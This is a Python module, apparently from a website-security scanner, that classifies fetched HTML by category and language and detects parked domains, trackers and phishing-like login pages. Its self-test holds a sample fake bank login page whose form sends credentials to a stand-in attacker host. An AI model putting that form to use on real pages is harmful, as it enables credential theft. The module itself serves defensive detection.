"""Page content analysis: category, language, parked detection, resources, contacted domains and trackers.

Pure function over HTML that was already fetched (no network access here). `analyze_content()` never
raises: on any error it returns the empty structure so the rest of the scan keeps working.
"""
from __future__ import annotations

import re
from collections import Counter
from functools import lru_cache
from urllib.parse import quote, urljoin, urlparse

from bs4 import BeautifulSoup

try:  # offline public-suffix list (bundled snapshot, never downloads)
    import tldextract

    _TLD = tldextract.TLDExtract(suffix_list_urls=(), cache_dir=None)
except Exception:  # pragma: no cover - fallback below
    _TLD = None

try:
    from langdetect import DetectorFactory, detect

    DetectorFactory.seed = 0  # deterministic results
except Exception:  # pragma: no cover
    detect = None

MAX_HTML = 1_500_000
MAX_RESOURCES = 200
SENSITIVE_CATEGORIES = {"banking", "payment", "crypto", "login"}

LANGUAGE_NAMES = {
    "en": "English", "hi": "Hindi", "bn": "Bengali", "ta": "Tamil", "te": "Telugu", "mr": "Marathi",
    "gu": "Gujarati", "kn": "Kannada", "ml": "Malayalam", "pa": "Punjabi", "ur": "Urdu", "ne": "Nepali",
    "es": "Spanish", "fr": "French", "de": "German", "it": "Italian", "pt": "Portuguese", "nl": "Dutch",
    "ru": "Russian", "uk": "Ukrainian", "pl": "Polish", "cs": "Czech", "ro": "Romanian", "hu": "Hungarian",
    "el": "Greek", "tr": "Turkish", "sv": "Swedish", "no": "Norwegian", "da": "Danish", "fi": "Finnish",
    "ar": "Arabic", "fa": "Persian", "he": "Hebrew", "zh-cn": "Chinese (Simplified)",
    "zh-tw": "Chinese (Traditional)", "ja": "Japanese", "ko": "Korean", "vi": "Vietnamese",
    "th": "Thai", "id": "Indonesian", "tl": "Tagalog", "sw": "Swahili", "af": "Afrikaans",
}

# Weighted keyword dictionaries (weight 1 = weak hint, 3 = strong signal).
CATEGORY_KEYWORDS: dict[str, dict[str, int]] = {
    "banking": {"bank": 3, "banking": 3, "netbanking": 3, "net banking": 3, "online banking": 3, "ifsc": 3,
                "account number": 2, "savings account": 2, "credit card": 2, "debit card": 2, "loan": 2,
                "mortgage": 2, "interest rate": 2, "fixed deposit": 2, "atm": 2, "iban": 3, "routing number": 3,
                "wire transfer": 2, "fund transfer": 2, "kyc": 2, "branch": 1, "otp": 1},
    "payment": {"payment": 2, "payments": 2, "pay now": 3, "checkout": 2, "billing": 2, "invoice": 2,
                "paypal": 3, "stripe": 2, "upi": 3, "paytm": 3, "phonepe": 3, "google pay": 3, "gpay": 3,
                "card number": 3, "cvv": 3, "cvc": 2, "expiry date": 2, "expiration date": 2, "transaction": 2,
                "merchant": 2, "wallet": 1, "refund": 1},
    "shopping": {"shop": 2, "shopping": 2, "cart": 2, "add to cart": 3, "buy now": 2, "free shipping": 3,
                 "free delivery": 2, "discount": 2, "deals": 2, "coupon": 2, "wishlist": 2, "products": 1,
                 "store": 1, "order": 1, "sale": 1, "price": 1, "amazon": 2, "flipkart": 3, "ebay": 2},
    "crypto": {"crypto": 3, "cryptocurrency": 3, "bitcoin": 3, "btc": 2, "ethereum": 3, "blockchain": 2,
               "metamask": 3, "seed phrase": 3, "recovery phrase": 3, "private key": 2, "airdrop": 3,
               "connect wallet": 3, "binance": 3, "coinbase": 3, "usdt": 3, "defi": 2, "staking": 2, "nft": 2,
               "web3": 2, "token": 1, "wallet": 1},
    "social": {"facebook": 2, "instagram": 2, "twitter": 2, "tiktok": 2, "whatsapp": 2, "telegram": 2,
               "linkedin": 2, "snapchat": 2, "messenger": 2, "followers": 2, "social": 2, "friends": 1,
               "profile": 1, "community": 1, "post": 1, "share": 1},
    "email": {"inbox": 3, "mailbox": 3, "webmail": 3, "outlook": 3, "gmail": 3, "yahoo mail": 3,
              "roundcube": 3, "zimbra": 3, "office 365": 2, "owa": 2, "compose": 2, "imap": 2, "smtp": 2,
              "email": 1, "e-mail": 1, "mail": 1},
    "cloud_storage": {"onedrive": 3, "dropbox": 3, "google drive": 3, "icloud": 3, "sharepoint": 3,
                      "wetransfer": 3, "docusign": 3, "shared document": 3, "shared file": 3, "view document": 3,
                      "storage": 2, "upload": 2, "cloud": 1, "drive": 1, "folder": 1, "file": 1},
    "government": {"government": 3, "govt": 3, "ministry": 3, "income tax": 3, "irs": 3, "passport": 3,
                   "aadhaar": 3, "pan card": 3, "social security": 3, "e-filing": 3, "citizen": 2,
                   "citizens": 2, "public service": 2, "municipal": 2, "election": 2, "tax": 2, "gov": 2,
                   "department": 1, "portal": 1},
    "education": {"university": 3, "college": 3, "education": 3, "admission": 3, "admissions": 3,
                  "school": 2, "student": 2, "students": 2, "course": 2, "courses": 2, "campus": 2,
                  "faculty": 2, "exam": 2, "academic": 2, "degree": 2, "semester": 2, "scholarship": 2,
                  "learning": 1},
    "news": {"news": 3, "headlines": 3, "breaking news": 3, "live updates": 3, "editorial": 2, "reporter": 2,
             "journalist": 2, "politics": 2, "breaking": 2, "opinion": 1, "latest": 1, "weather": 1, "press": 1},
    "technology": {"software": 2, "technology": 2, "developer": 2, "developers": 2, "api": 2, "open source": 2,
                   "github": 2, "programming": 2, "hosting": 2, "saas": 2, "cloud computing": 2, "tech": 1,
                   "app": 1, "code": 1, "server": 1, "platform": 1},
    "entertainment": {"movie": 2, "movies": 2, "music": 2, "streaming": 2, "stream": 2, "tv shows": 3,
                      "netflix": 3, "episode": 2, "songs": 2, "games": 2, "gaming": 2, "celebrity": 2,
                      "trailer": 2, "anime": 2, "video": 1, "videos": 1, "watch": 1, "series": 1},
    "adult": {"porn": 3, "xxx": 3, "nude": 3, "nsfw": 3, "escort": 3, "hot singles": 3, "sex": 2, "18+": 2,
              "adult": 1},
    "gambling": {"casino": 3, "betting": 3, "poker": 3, "slots": 3, "jackpot": 3, "lottery": 3, "roulette": 3,
                 "sportsbook": 3, "blackjack": 3, "wager": 3, "bet": 2, "odds": 1, "bonus": 1, "spin": 1},
    "parked": {"domain for sale": 3, "domain is for sale": 3, "buy this domain": 3, "domain may be for sale": 3,
               "parked free": 3, "make an offer": 2, "related searches": 2, "parked": 2, "sedo": 3,
               "hugedomains": 3, "afternic": 3},
    "login": {"sign in": 3, "log in": 3, "login": 3, "password": 3, "forgot password": 3, "username": 2,
              "remember me": 2, "verify your account": 2, "authentication": 2, "two-factor": 2, "account": 1},
}

# keyword -> [(category, weight)]; one combined regex (longest phrases first) keeps matching fast.
_KW_MAP: dict[str, list[tuple[str, int]]] = {}
for _cat, _words in CATEGORY_KEYWORDS.items():
    for _kw, _w in _words.items():
        _KW_MAP.setdefault(_kw, []).append((_cat, _w))
_KW_RE = re.compile(
    r"(?<![a-z0-9])(" + "|".join(re.escape(k) for k in sorted(_KW_MAP, key=len, reverse=True)) + r")(?![a-z0-9])"
)

PARKING_PROVIDERS = ("sedoparking", "bodis", "parkingcrew", "above.com", "dan.com", "afternic",
                     "hugedomains", "uniregistry", "parklogic", "namebright")
PARKED_PHRASES = ("domain is for sale", "domain may be for sale", "buy this domain", "parked free",
                  "this domain is parked", "domain is parked", "this domain has been registered and is parked")

TRACKER_PATTERNS = [
    ("google_analytics", re.compile(r"\b(UA-\d{4,10}-\d{1,4})\b")),
    ("gtag", re.compile(r"\b(G-(?=[A-Z]*\d)[A-Z0-9]{6,12})\b")),
    ("gtm", re.compile(r"\b(GTM-[A-Z0-9]{4,10})\b")),
    ("facebook_pixel", re.compile(r"""fbq\(\s*['"]init['"]\s*,\s*['"]?(\d{6,20})""")),
    ("adsense", re.compile(r"\b(ca-pub-\d{10,20})\b")),
    ("hotjar", re.compile(r"""hjid['"]?\s*:\s*(\d{4,12})""")),
]

# (tag, attribute, resource type)
RESOURCE_TAGS = [
    ("script", "src", "script"), ("img", "src", "image"), ("iframe", "src", "iframe"), ("frame", "src", "iframe"),
    ("form", "action", "form"), ("video", "src", "media"), ("audio", "src", "media"), ("source", "src", "media"),
    ("embed", "src", "other"), ("object", "data", "other"), ("a", "href", "link"),
]


def _empty(final_url: str = "") -> dict:
    return {
        "content": {
            "language": None, "language_name": None, "translate_url": _translate_url(final_url),
            "category": "other", "category_confidence": 0.0, "categories": [],
            "parked": {"parked": False, "reason": None}, "word_count": 0, "text_excerpt": "",
        },
        "resources": [], "contacted_domains": [], "trackers": [], "checks": [], "summary_points": [],
    }


def _translate_url(final_url: str) -> str:
    return "https://translate.google.com/translate?sl=auto&tl=en&u=" + quote(final_url or "", safe="")


def _check(cid: str, name: str, status: str, detail: str, weight: int) -> dict:
    return {"id": cid, "category": "content", "name": name, "status": status, "detail": detail, "weight": weight}


@lru_cache(maxsize=4096)
def _registered_domain(host: str) -> str:
    """'login.secure.example.co.uk' -> 'example.co.uk' (IPs and bare hosts are returned unchanged)."""
    host = (host or "").lower().strip(".")
    if not host:
        return ""
    if _TLD is None:
        return ".".join(host.split(".")[-2:])
    ext = _TLD(host)
    return f"{ext.domain}.{ext.suffix}" if ext.domain and ext.suffix else host


# ------------------------------------------------------------------------------------------ pieces

def _collect_resources(soup: BeautifulSoup, final_url: str, site_domain: str) -> list[dict]:
    """Every http(s) URL referenced by the page, de-duplicated, in document order."""
    found, seen = [], set()

    def add(raw, rtype: str, tag: str):
        raw = (raw or "").strip()
        if not raw or raw.startswith(("#", "javascript:", "data:", "mailto:", "tel:", "blob:")):
            return
        url = urljoin(final_url, raw)
        parsed = urlparse(url)
        if parsed.scheme not in ("http", "https") or not parsed.hostname:
            return
        if (url, rtype) in seen:
            return
        seen.add((url, rtype))
        reg = _registered_domain(parsed.hostname)
        found.append({"url": url[:500], "domain": parsed.hostname.lower(), "type": rtype,
                      "third_party": bool(site_domain) and reg != site_domain, "_tag": tag})

    for el in soup.find_all("link", href=True):
        rel = " ".join(el.get("rel") or []).lower()
        rtype = "stylesheet" if "stylesheet" in rel else "image" if "icon" in rel else "link"
        add(el["href"], rtype, "link")
    for tag, attr, rtype in RESOURCE_TAGS:
        for el in soup.find_all(tag, attrs={attr: True}):
            add(el.get(attr), rtype, tag)
    return found


def _find_trackers(html: str) -> list[dict]:
    trackers, seen = [], set()
    for ttype, pattern in TRACKER_PATTERNS:
        for tid in pattern.findall(html):
            if (ttype, tid) not in seen:
                seen.add((ttype, tid))
                trackers.append({"type": ttype, "id": tid})
    return trackers[:20]


def _detect_parked(text: str, ns: list[str], resource_domains: set[str]) -> dict:
    for server in ns or []:
        server_l = str(server).lower()
        for provider in PARKING_PROVIDERS:
            if provider in server_l:
                return {"parked": True, "reason": f"Nameserver {server_l} belongs to parking provider '{provider}'"}
    for phrase in PARKED_PHRASES:
        if phrase in text:
            return {"parked": True, "reason": f"Page text says '{phrase}'"}
    for domain in resource_domains:
        for provider in PARKING_PROVIDERS:
            if provider.split(".")[0] in domain:
                return {"parked": True, "reason": f"Page loads resources from parking service {domain}"}
    return {"parked": False, "reason": None}


def _detect_language(text: str) -> tuple[str | None, str | None]:
    if detect is None or len(text) < 25:
        return None, None
    try:
        code = detect(text[:5000])
    except Exception:
        return None, None
    return code, LANGUAGE_NAMES.get(code, code)


def _score_categories(sources: list[tuple[str, float]], has_password: bool) -> dict[str, float]:
    """Weighted keyword hits per category; each keyword counts at most 5 times per source."""
    raw: dict[str, float] = {}
    for text, source_weight in sources:
        for kw, count in Counter(_KW_RE.findall(text)).items():
            for cat, w in _KW_MAP[kw]:
                raw[cat] = raw.get(cat, 0.0) + w * min(count, 5) * source_weight
    if has_password:  # a password field is the strongest possible login signal
        raw["login"] = raw.get("login", 0.0) + 15
    return raw


# ------------------------------------------------------------------------------------------ main

def analyze_content(html: str, final_url: str, title: str | None = None, ns: list[str] | None = None) -> dict:
    try:
        return _analyze(html or "", final_url or "", title, ns or [])
    except Exception:
        return _empty(final_url or "")


def _analyze(html: str, final_url: str, title: str | None, ns: list[str]) -> dict:
    result = _empty(final_url)
    html = html[:MAX_HTML]
    soup = BeautifulSoup(html, "html.parser")
    site_host = (urlparse(final_url).hostname or "").lower()
    site_domain = _registered_domain(site_host)

    # --- resources / contacted domains / trackers (before scripts are stripped for text) ---
    all_resources = _collect_resources(soup, final_url, site_domain)
    loaded = [r for r in all_resources if r["_tag"] != "a"]  # anchors are not contacted on page load
    counts = Counter(r["domain"] for r in loaded)
    third = {r["domain"]: r["third_party"] for r in loaded}
    contacted = [{"domain": d, "count": c, "third_party": third[d]} for d, c in counts.most_common()]
    resources = [{k: v for k, v in r.items() if k != "_tag"} for r in all_resources[:MAX_RESOURCES]]
    trackers = _find_trackers(html)

    # --- text ---
    if title is None and soup.title and soup.title.string:
        title = soup.title.string
    title = (title or "").strip()
    meta = soup.find("meta", attrs={"name": re.compile(r"^description$", re.I)}) or \
        soup.find("meta", attrs={"property": re.compile(r"^og:description$", re.I)})
    description = (meta.get("content") or "").strip() if meta else ""
    has_password = soup.find("input", attrs={"type": re.compile(r"^password$", re.I)}) is not None
    for el in soup(["script", "style", "noscript", "template", "svg"]):
        el.decompose()
    root = soup.body or soup
    text = re.sub(r"\s+", " ", root.get_text(" ", strip=True)).strip()
    word_count = len(re.findall(r"\w+", text))
    excerpt = text if len(text) <= 300 else text[:299].rsplit(" ", 1)[0] + "…"

    # --- language / parked / category ---
    language, language_name = _detect_language(f"{title} {description} {text}".strip())
    lower_text = f"{title} {text}".lower()
    parked = _detect_parked(lower_text, ns, {r["domain"] for r in loaded})
    url_tokens = re.sub(r"[^a-z0-9]+", " ", final_url.lower())
    raw = _score_categories([(f"{title} {description}".lower(), 3.0), (url_tokens, 2.0),
                             (lower_text[:30000], 1.0)], has_password)
    total = sum(raw.values()) or 1.0
    ranked = sorted(raw.items(), key=lambda kv: kv[1], reverse=True)
    categories = [{"name": name, "score": round(score / total, 3)} for name, score in ranked[:5] if score > 0]

    if parked["parked"]:
        category, confidence = "parked", 0.95
    elif has_password:
        category, confidence = "login", 0.95
    elif ranked and ranked[0][1] >= 4:
        top, top_raw = ranked[0]
        category = top
        confidence = round((top_raw / total) * min(1.0, top_raw / 12), 2)  # share x evidence strength
    else:
        category, confidence = "other", 0.0

    result["content"].update({
        "language": language, "language_name": language_name, "category": category,
        "category_confidence": confidence, "categories": categories, "parked": parked,
        "word_count": word_count, "text_excerpt": excerpt,
    })
    result.update({"resources": resources, "contacted_domains": contacted, "trackers": trackers})

    # --- checks ---
    checks = [
        _check("parked_domain", "Parked domain", "warn", f"Looks like a parked domain: {parked['reason']}", 4)
        if parked["parked"] else
        _check("parked_domain", "Parked domain", "pass", "Page does not look like a parked domain", 4),
    ]
    if trackers:
        names = ", ".join(f"{t['type']} ({t['id']})" for t in trackers[:5])
        checks.append(_check("tracker_present", "Analytics / ad trackers", "info",
                             f"{len(trackers)} tracker(s) found: {names}", 1))
    else:
        checks.append(_check("tracker_present", "Analytics / ad trackers", "info",
                             "No common analytics or advertising trackers found", 1))
    label = category.replace("_", " ")
    if category in SENSITIVE_CATEGORIES:
        checks.append(_check("category_sensitive", "Sensitive page category", "info",
                             f"Page category is '{label}' - a type of page often imitated by phishing sites", 1))
    else:
        checks.append(_check("category_sensitive", "Sensitive page category", "pass",
                             f"Page category is '{label}' (not a commonly phished category)", 1))
    third_count = sum(1 for r in loaded if r["third_party"])
    ratio = third_count / len(loaded) if loaded else 0.0
    many_third = has_password and len(loaded) >= 3 and ratio > 0.8
    if has_password:
        if many_third:
            checks.append(_check("many_third_party", "Third-party resources on login page", "warn",
                                 f"{third_count} of {len(loaded)} resources ({ratio:.0%}) on this login page come "
                                 "from other domains - typical of copied phishing kits", 5))
        else:
            checks.append(_check("many_third_party", "Third-party resources on login page", "pass",
                                 f"{third_count} of {len(loaded)} resources on this login page are third-party", 5))
    result["checks"] = checks

    # --- summary points ---
    points = [f"Content category: {label}" + (f" ({confidence:.0%} confidence)" if confidence else "")]
    if language_name:
        points.append(f"Page language: {language_name}")
    if parked["parked"]:
        points.append(f"Parked domain - {parked['reason']}")
    if has_password:
        points.append("Page contains a password field (login form)")
    if loaded:
        points.append(f"Loads {len(loaded)} resources from {len(contacted)} domain(s), "
                      f"{sum(1 for c in contacted if c['third_party'])} of them third-party")
    if trackers:
        points.append(f"{len(trackers)} tracker(s): " + ", ".join(sorted({t['type'] for t in trackers})))
    if many_third:
        points.append(f"{ratio:.0%} of login-page resources are loaded from other domains")
    result["summary_points"] = points
    return result


if __name__ == "__main__":  # quick self-test: python -m app.analysis.content (from backend/)
    import json

    sample = """<html><head><title>SBI Online Banking - Login</title>
    <meta name="description" content="Secure net banking login for your bank account">
    <link rel="stylesheet" href="https://cdn.othersite.com/style.css"><link rel="icon" href="/favicon.ico">
    <script src="https://www.googletagmanager.com/gtag/js?id=G-AB12CD34EF"></script>
    <script>gtag('config','G-AB12CD34EF'); fbq('init', '123456789012');</script></head>
    <body><h1>Welcome to Online Banking</h1><p>Please sign in to your bank account to verify your KYC.</p>
    <form action="https://collect.evil-host.ru/post.php"><input name="user"><input type="password" name="pw"></form>
    <img src="https://img.bank-assets.net/logo.png"><a href="/help">Forgot password?</a></body></html>"""
    out = analyze_content(sample, "https://sbi-secure-login.example.com/login", ns=["ns1.example.net"])
    print(json.dumps(out, indent=2, ensure_ascii=False))
    parked = analyze_content("<p>This domain is for sale! Buy this domain today.</p>", "http://foo.xyz/",
                             ns=["ns1.sedoparking.com"])
    print("parked:", parked["content"]["category"], parked["content"]["parked"])
    print("empty:", analyze_content(None, None)["content"]["category"], analyze_content("", "x")["checks"][0]["status"])
